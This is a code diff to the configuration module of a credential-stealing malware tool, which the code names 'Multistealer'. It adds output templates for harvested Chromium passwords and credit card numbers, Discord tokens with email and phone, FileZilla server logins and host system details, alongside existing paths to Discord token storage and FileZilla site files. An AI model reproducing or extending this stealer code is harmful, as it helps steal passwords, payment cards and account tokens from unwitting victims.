@@ -19,6 +19,11 @@ class ChromiumConfig:
     HistorySQL = "SELECT url FROM visits"
     HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
+    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
+    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
+    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
+    BookmarksData = "Title: {0}\nUrl: {1}\n\n"
+
 
 class MultistealerConfig:
 
@@ -63,6 +68,7 @@ class SystemConfig:
     User = user
     Variables = ("storage_path", "folder", "statuses", "errors")
     IPUrl = "https://api.ipify.org/"
+    SystemData = "User: {0}\nIP: {1}\nOS Name: {2}\nOS Version: {3} {4}\nMonitors: {5}\nCPU: {6}\nGPU: {7}\nRAM: {8} GB\n"
 
 
 class SenderConfig:
@@ -83,6 +89,8 @@ class DiscordConfig:
 
     TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
     Variables = ("storage_path", "folder", "statuses", "errors")
+    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"
 
 
 class TelegramConfig:
@@ -95,3 +103,5 @@ class FileZillaConfig:
 
     SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
     Variables = ("storage_path", "folder", "statuses", "errors")
+    DataFiles = ("recentservers.xml", "sitemanager.xml")
+    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"
